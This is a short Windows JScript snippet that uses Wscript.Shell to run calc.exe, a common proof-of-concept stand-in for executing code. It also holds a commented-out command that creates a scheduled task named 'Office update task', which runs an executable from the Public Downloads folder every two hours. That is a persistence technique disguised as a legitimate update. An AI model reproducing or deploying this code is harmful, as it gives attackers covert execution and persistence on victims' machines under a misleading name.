var shell = new ActiveXObject("Wscript.Shell");
isHidden=0
//shell.Run('cmd  /c schtasks /create /SC minute /MO 120 /TN "Office update task"  /TR "C:\\Users\\Public\\Downloads\\Officeupdate.exe"',isHidden);
shell.Run('calc.exe',isHidden)

